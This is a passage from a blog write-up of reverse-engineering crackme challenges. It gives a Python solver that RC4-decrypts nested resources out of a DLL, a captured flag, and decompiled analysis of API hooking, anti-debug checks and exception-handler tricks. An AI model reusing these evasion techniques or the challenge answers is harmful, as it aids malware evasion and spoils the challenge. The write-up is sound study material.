class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> key: <span class="keyword">raise</span> ValueError(<span class="string">&quot;RC4 key cant be empty&quot;</span>)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % key_len]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    out = <span class="built_in">bytearray</span>(<span class="built_in">len</span>(data))</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">        out[n] = b ^ k</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(out)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_indexed_results</span>(<span class="params">workdir: Path</span>) -&gt; <span class="type">Dict</span>[<span class="built_in">int</span>, Path]:</span><br><span class="line">    out: <span class="type">Dict</span>[<span class="built_in">int</span>, Path] = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> workdir.glob(<span class="string">&quot;recover_result_*.json&quot;</span>):</span><br><span class="line">        m = IDX_RE.<span class="keyword">match</span>(p.name)</span><br><span class="line">        <span class="keyword">if</span> m: out[<span class="built_in">int</span>(m.group(<span class="number">1</span>))] = p</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_int</span>(<span class="params">v, default=-<span class="number">1</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">try</span>: <span class="keyword">return</span> <span class="built_in">int</span>(v)</span><br><span class="line">    <span class="keyword">except</span> Exception: <span class="keyword">return</span> default</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">candidate_score</span>(<span class="params">c: <span class="built_in">dict</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">int</span>, <span class="built_in">int</span>, <span class="built_in">int</span>]:</span><br><span class="line">    status = <span class="built_in">str</span>(c.get(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    ok = <span class="number">1</span> <span class="keyword">if</span> status.startswith(<span class="string">&quot;ok&quot;</span>) <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    uniq_cnt = <span class="number">0</span></span><br><span class="line">    uq = c.get(<span class="string">&quot;uniqueness&quot;</span>, &#123;&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(uq, <span class="built_in">dict</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> (<span class="string">&quot;q0&quot;</span>, <span class="string">&quot;q1&quot;</span>, <span class="string">&quot;q2&quot;</span>, <span class="string">&quot;q3&quot;</span>):</span><br><span class="line">            v = uq.get(k, &#123;&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>) <span class="keyword">and</span> <span class="built_in">bool</span>(v.get(<span class="string">&quot;unique&quot;</span>)): uniq_cnt += <span class="number">1</span></span><br><span class="line">    shr = safe_int(c.get(<span class="string">&quot;shr_num&quot;</span>), -<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> (ok, uniq_cnt, shr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_rc4_key_from_recover_result</span>(<span class="params">path: Path</span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    data = json.loads(path.read_text(encoding=<span class="string">&quot;utf-8&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">    cands = data.get(<span class="string">&quot;candidates&quot;</span>, [])</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(cands, <span class="built_in">list</span>) <span class="keyword">or</span> <span class="keyword">not</span> cands: <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;<span class="subst">&#123;path.name&#125;</span> has no candidates&quot;</span>)</span><br><span class="line">    valid = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> cands:</span><br><span class="line">        hx = (c.get(<span class="string">&quot;input32_hex&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span>).strip().lower()</span><br><span class="line">        <span class="keyword">if</span> re.fullmatch(<span class="string">r&quot;[0-9a-f]&#123;64&#125;&quot;</span>, hx): valid.append((candidate_score(c), c, hx))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid: <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;<span class="subst">&#123;path.name&#125;</span> candidates has no input32_hex(64 hex)&quot;</span>)</span><br><span class="line"></span><br><span class="line">    valid.sort(key=<span class="keyword">lambda</span> t: t[<span class="number">0</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">    best_score, best_c, best_hx = valid[<span class="number">0</span>]</span><br><span class="line">    key = <span class="built_in">bytes</span>.fromhex(best_hx)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(key) != <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;<span class="subst">&#123;path.name&#125;</span> keylen != 32&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(</span><br><span class="line">        <span class="string">f&quot;[key] use <span class="subst">&#123;path.name&#125;</span>: score=<span class="subst">&#123;best_score&#125;</span>, &quot;</span></span><br><span class="line">        <span class="string">f&quot;status=<span class="subst">&#123;best_c.get(<span class="string">&#x27;status&#x27;</span>)&#125;</span>, shr=<span class="subst">&#123;best_c.get(<span class="string">&#x27;shr_num&#x27;</span>)&#125;</span>, key=<span class="subst">&#123;best_hx&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_named_resource</span>(<span class="params">pe_path: Path, target_name: <span class="built_in">str</span></span>) -&gt; <span class="type">Optional</span>[<span class="built_in">bytes</span>]:</span><br><span class="line">    target = target_name.upper()</span><br><span class="line">    pe = pefile.PE(<span class="built_in">str</span>(pe_path), fast_load=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(pe, <span class="string">&quot;DIRECTORY_ENTRY_RESOURCE&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> rtype <span class="keyword">in</span> pe.DIRECTORY_ENTRY_RESOURCE.entries:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(rtype, <span class="string">&quot;directory&quot;</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">for</span> rname <span class="keyword">in</span> rtype.directory.entries:</span><br><span class="line">                name_str = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">if</span> rname.name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    name_str = <span class="built_in">str</span>(rname.name).rstrip(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>: <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> name_str.upper() != target: <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(rname, <span class="string">&quot;directory&quot;</span>): <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">for</span> rlang <span class="keyword">in</span> rname.directory.entries:</span><br><span class="line">                    data_entry = rlang.data</span><br><span class="line">                    rva = data_entry.struct.OffsetToData</span><br><span class="line">                    size = data_entry.struct.Size</span><br><span class="line">                    blob = pe.get_data(rva, size)</span><br><span class="line">                    <span class="keyword">return</span> blob</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">finally</span>: pe.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_auto_script</span>(<span class="params"></span></span><br><span class="line"><span class="params">    workdir: Path,</span></span><br><span class="line"><span class="params">    python_exe: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    auto_script: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    auto_args: <span class="type">List</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    recover_result_name: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    timeout_sec: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    quiet: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    result_path = workdir / recover_result_name</span><br><span class="line">    <span class="keyword">if</span> result_path.exists(): result_path.unlink()</span><br><span class="line">    cmd = [python_exe, auto_script] + auto_args</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[auto] run: <span class="subst">&#123;<span class="string">&#x27; &#x27;</span>.join(cmd)&#125;</span>&quot;</span>)</span><br><span class="line">    cp = subprocess.run(</span><br><span class="line">        cmd,</span><br><span class="line">        cwd=<span class="built_in">str</span>(workdir),</span><br><span class="line">        stdout=subprocess.DEVNULL <span class="keyword">if</span> quiet <span class="keyword">else</span> <span class="literal">None</span>,</span><br><span class="line">        stderr=subprocess.DEVNULL <span class="keyword">if</span> quiet <span class="keyword">else</span> <span class="literal">None</span>,</span><br><span class="line">        timeout=timeout_sec,</span><br><span class="line">        check=<span class="literal">False</span>,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result_path.exists(): <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;auto.py returns no <span class="subst">&#123;recover_result_name&#125;</span> (returncode=<span class="subst">&#123;cp.returncode&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> cp.returncode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bootstrap_initial_result0</span>(<span class="params"></span></span><br><span class="line"><span class="params">    workdir: Path,</span></span><br><span class="line"><span class="params">    python_exe: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    auto_script: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    auto_args: <span class="type">List</span>[<span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    recover_result_name: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    timeout_sec: <span class="type">Optional</span>[<span class="built_in">int</span>],</span></span><br><span class="line"><span class="params">    quiet: <span class="built_in">bool</span>,</span>):</span><br><span class="line">    indexed = list_indexed_results(workdir)</span><br><span class="line">    <span class="keyword">if</span> indexed: <span class="keyword">return</span></span><br><span class="line">    plain = workdir / recover_result_name</span><br><span class="line">    r0 = workdir / <span class="string">&quot;recover_result_0.json&quot;</span></span><br><span class="line">    <span class="keyword">if</span> plain.exists():</span><br><span class="line">        <span class="keyword">if</span> r0.exists(): <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Exist recover_result.json and recover_result_0.json exists but conflict.&quot;</span>)</span><br><span class="line">        plain.replace(r0)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[bootstrap] recover_result.json -&gt; recover_result_0.json&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[bootstrap] no recover_result found, run auto.py to generate initial key&quot;</span>)</span><br><span class="line">    run_auto_script(</span><br><span class="line">        workdir=workdir,</span><br><span class="line">        python_exe=python_exe,</span><br><span class="line">        auto_script=auto_script,</span><br><span class="line">        auto_args=auto_args,</span><br><span class="line">        recover_result_name=recover_result_name,</span><br><span class="line">        timeout_sec=timeout_sec,</span><br><span class="line">        quiet=quiet,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">if</span> r0.exists(): <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Gen recover_result.json but recover_result_0.json exists&quot;</span>)</span><br><span class="line">    (workdir / recover_result_name).replace(r0)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[bootstrap] recover_result.json -&gt; recover_result_0.json&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    ap = argparse.ArgumentParser(description=<span class="string">&quot;Matryoshka&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--workdir&quot;</span>, default=<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--dll&quot;</span>, default=<span class="string">&quot;Doll.dll&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--resource-name&quot;</span>, default=<span class="string">&quot;MATRYOSHKA&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--recover-result-name&quot;</span>, default=<span class="string">&quot;recover_result.json&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--auto-script&quot;</span>, default=<span class="string">&quot;autore.py&quot;</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--python&quot;</span>, dest=<span class="string">&quot;python_exe&quot;</span>, default=sys.executable)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--auto-arg&quot;</span>, action=<span class="string">&quot;append&quot;</span>, default=[])</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--timeout&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="literal">None</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--max-rounds&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">200</span>)</span><br><span class="line">    ap.add_argument(<span class="string">&quot;--quiet&quot;</span>, action=<span class="string">&quot;store_true&quot;</span>)</span><br><span class="line">    args = ap.parse_args()</span><br><span class="line">    workdir = Path(args.workdir).resolve()</span><br><span class="line">    dll_path = workdir / args.dll</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> dll_path.exists(): <span class="keyword">raise</span> FileNotFoundError(<span class="string">f&quot;DLL not found: <span class="subst">&#123;dll_path&#125;</span>&quot;</span>)</span><br><span class="line">    auto_script_path = workdir / args.auto_script</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> auto_script_path.exists(): <span class="keyword">raise</span> FileNotFoundError(<span class="string">f&quot;Script not found: <span class="subst">&#123;auto_script_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] workdir = <span class="subst">&#123;workdir&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] dll     = <span class="subst">&#123;dll_path.name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] auto    = <span class="subst">&#123;args.auto_script&#125;</span>&quot;</span>)</span><br><span class="line">    bootstrap_initial_result0(</span><br><span class="line">        workdir=workdir,</span><br><span class="line">        python_exe=args.python_exe,</span><br><span class="line">        auto_script=args.auto_script,</span><br><span class="line">        auto_args=args.auto_arg,</span><br><span class="line">        recover_result_name=args.recover_result_name,</span><br><span class="line">        timeout_sec=args.timeout,</span><br><span class="line">        quiet=args.quiet,)</span><br><span class="line">    stem = dll_path.stem</span><br><span class="line">    suffix = dll_path.suffix</span><br><span class="line">    <span class="keyword">for</span> round_i <span class="keyword">in</span> <span class="built_in">range</span>(args.max_rounds):</span><br><span class="line">        indexed = list_indexed_results(workdir)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> indexed: <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;No recover_result_&lt;idx&gt;.json&quot;</span>)</span><br><span class="line">        idx = <span class="built_in">max</span>(indexed.keys())</span><br><span class="line">        result_idx_path = indexed[idx]</span><br><span class="line">        next_result_path = workdir / <span class="string">f&quot;recover_result_<span class="subst">&#123;idx + <span class="number">1</span>&#125;</span>.json&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n===== ROUND <span class="subst">&#123;round_i&#125;</span> | idx=<span class="subst">&#123;idx&#125;</span> =====&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[state] current key source: <span class="subst">&#123;result_idx_path.name&#125;</span>&quot;</span>)</span><br><span class="line">        mat_blob = extract_named_resource(dll_path, args.resource_name)</span><br><span class="line">        <span class="keyword">if</span> mat_blob <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[done] <span class="subst">&#123;dll_path.name&#125;</span> has no <span class="subst">&#123;args.resource_name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[res] found <span class="subst">&#123;args.resource_name&#125;</span>, size=<span class="subst">&#123;<span class="built_in">len</span>(mat_blob)&#125;</span> bytes&quot;</span>)</span><br><span class="line">        key = load_rc4_key_from_recover_result(result_idx_path)</span><br><span class="line">        backup_dll = workdir / <span class="string">f&quot;<span class="subst">&#123;stem&#125;</span>_<span class="subst">&#123;idx&#125;</span><span class="subst">&#123;suffix&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> backup_dll.exists():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[skip] <span class="subst">&#123;backup_dll.name&#125;</span> exists&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dec = rc4_crypt(key, mat_blob)</span><br><span class="line">            os.replace(dll_path, backup_dll)</span><br><span class="line">            dll_path.write_bytes(dec)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[ok] backup old -&gt; <span class="subst">&#123;backup_dll.name&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[ok] write decrypted -&gt; <span class="subst">&#123;dll_path.name&#125;</span> (<span class="subst">&#123;<span class="built_in">len</span>(dec)&#125;</span> bytes)&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> next_result_path.exists():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[skip] <span class="subst">&#123;next_result_path.name&#125;</span> already exists, skip auto.py&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        rc = run_auto_script(</span><br><span class="line">            workdir=workdir,</span><br><span class="line">            python_exe=args.python_exe,</span><br><span class="line">            auto_script=args.auto_script,</span><br><span class="line">            auto_args=args.auto_arg,</span><br><span class="line">            recover_result_name=args.recover_result_name,</span><br><span class="line">            timeout_sec=args.timeout,</span><br><span class="line">            quiet=args.quiet,)</span><br><span class="line">        plain_result = workdir / args.recover_result_name</span><br><span class="line">        plain_result.replace(next_result_path)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[ok] auto.py rc=<span class="subst">&#123;rc&#125;</span>, rename -&gt; <span class="subst">&#123;next_result_path.name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Reach max_rounds=<span class="subst">&#123;args.max_rounds&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong>CMO{1NsiD3_EV3RY_stOrY_lIe$_an0TH3r_s70Ry_WAITiNG_7o_bE_oPEn3d}</strong></font></p>
<h3 id="Crackme-9"><a href="#Crackme-9" class="headerlink" title="Crackme #9"></a>Crackme #9</h3><p>There are lots of functions with junk codes, after removing obfuscating, some of them have similar format:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __thiscall <span class="title">Obf_funcXX</span><span class="params">(_DWORD *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  this_1 = <span class="keyword">this</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="keyword">this</span>[XX] )</span><br><span class="line">  &#123;</span><br><span class="line">    xx = Val;</span><br><span class="line">    v4[<span class="number">1</span>] = *this_1;</span><br><span class="line">    v5 = <span class="built_in">Obf_funcXX</span>(this_1);</span><br><span class="line">    v2 = <span class="built_in">sub_401CBA</span>(v4, v5, Val);</span><br><span class="line">    v3 = <span class="built_in">sub_40118D</span>(v2);</span><br><span class="line">    this_1[<span class="number">12</span>] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> this_1[XX];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The <code>sub_401CBA</code> is a function to search for DLL functions:</p>
<table>
<thead>
<tr>
<th>Address of function</th>
<th>Name sub_401CBA returns</th>
</tr>
</thead>
<tbody><tr>
<td>sub_401397</td>
<td>user32_CallWindowProcA</td>
</tr>
<tr>
<td>sub_401010, sub_4013DA</td>
<td>advapi32_CryptAcquireContextA</td>
</tr>
<tr>
<td>sub_401022, sub_401443</td>
<td>advapi32_CryptCreateHash</td>
</tr>
<tr>
<td>sub_401058, sub_40158D</td>
<td>advapi32_CryptDestroyHash</td>
</tr>
<tr>
<td>sub_40107C, sub_40166A</td>
<td>advapi32_CryptGetHashParam</td>
</tr>
<tr>
<td>sub_40108E, sub_4016DF</td>
<td>advapi32_CryptHashData</td>
</tr>
<tr>
<td>sub_402C24, sub_40187A</td>
<td>ntdll_KiUserExceptionDispatcher</td>
</tr>
<tr>
<td>sub_4010E4, sub_40194C</td>
<td>ntdll_NtContinue</td>
</tr>
<tr>
<td>sub_4010F6, sub_4019B5</td>
<td>ntdll_NtQueryInformationProcess</td>
</tr>
<tr>
<td>sub_402BC7, sub_401B2E</td>
<td>ntdll_Wow64Transition</td>
</tr>
</tbody></table>
<p>Notice that there is a function executed before main:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *__thiscall <span class="title">Hook_CallWindowProcA</span><span class="params">(<span class="type">void</span> *<span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_40113E</span>();</span><br><span class="line">  <span class="built_in">sub_40112C</span>();</span><br><span class="line">  CallWindowProcA = (<span class="built_in">LRESULT</span> (__stdcall *)(WNDPROC, HWND, UINT, WPARAM, LPARAM))sub_<span class="number">402E5</span>A;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This function changed the address of <code>CallWindowProcA</code> to a custom function <code>sub_402E5A</code>. For this function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">Hooked_CallWindowProcA</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4, <span class="type">int</span> a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v5 = <span class="built_in">sub_402BF1</span>();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">sub_402B6D</span>(v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (_BYTE *)<span class="built_in">sub_402CAC</span>();</span><br><span class="line">    <span class="built_in">sub_402CE0</span>(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">sub_402CAC</span>();</span><br><span class="line">    <span class="built_in">sub_402C24</span>(p_sub_<span class="number">402E1</span>C, &amp;unk_40D24C);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = <span class="built_in">sub_401367</span>();</span><br><span class="line">  v9 = (<span class="built_in">int</span> (__cdecl *)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))<span class="built_in">sub_401397</span>(v7);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">v9</span>(a1, a2, a3, a4, a5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The function <code>sub_402B6D</code> is an anti-debug function, will return 1 if debugger exists. <code>p_sub_402E1C</code> will install some handler for exception:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl __noreturn <span class="title">p_sub_402E1C</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  unk_40D254 = a1;</span><br><span class="line">  dword_40D250 = retaddr;</span><br><span class="line">  v1 = <span class="built_in">sub_40448C</span>();</span><br><span class="line">  <span class="built_in">sub_404562</span>(v1, (_DWORD *)dword_40D250, unk_40D254);</span><br><span class="line">  v2 = <span class="built_in">sub_40113E</span>();</span><br><span class="line">  <span class="built_in">sub_4010E4</span>(v2, unk_40D254, <span class="number">0</span>);</span><br><span class="line">  __debugbreak();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">_DWORD *__thiscall <span class="title">sub_404562</span><span class="params">(<span class="type">int</span> <span class="keyword">this</span>, _DWORD *a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_BYTE *)(<span class="keyword">this</span> + <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a2;</span><br><span class="line">    <span class="keyword">switch</span> ( *a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x80000003</span>:</span><br><span class="line">        <span class="keyword">return</span> (_DWORD *)<span class="built_in">sub_4042EC</span>((_DWORD *)<span class="keyword">this</span>, a3);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x80000004</span>:</span><br><span class="line">        <span class="keyword">return</span> (_DWORD *)<span class="built_in">sub_4043CA</span>(<span class="keyword">this</span>, a3);</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0x80000001</span>:</span><br><span class="line">        <span class="keyword">return</span> (_DWORD *)<span class="built_in">sub_404350</span>(<span class="keyword">this</span>, (<span class="type">int</span>)a2, a3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Then for the interaction logic of the program, check dialog table:</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.rdata:</span>0040B3F0                 <span class="built_in">dd</span> offset ??_R4MainDialog@@6B@ <span class="comment">; const MainDialog::`RTTI Complete Object Locator&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>0040B3F4 <span class="comment">; const MainDialog::`vftable&#x27;</span></span><br><span class="line"><span class="symbol">.rdata:</span>0040B3F4 ??_7MainDialog@@6B@ <span class="built_in">dd</span> offset sub_405377</span><br><span class="line"><span class="symbol">.rdata:</span>0040B3F4                                         <span class="comment">; DATA XREF: sub_405196+15↑o</span></span><br><span class="line"><span class="symbol">.rdata:</span>0040B3F4                                         <span class="comment">; sub_4052B8+7↑o</span></span><br><span class="line"><span class="symbol">.rdata:</span>0040B3F8                 <span class="built_in">dd</span> offset sub_4055D3</span><br><span class="line"><span class="symbol">.rdata:</span>0040B3FC                 <span 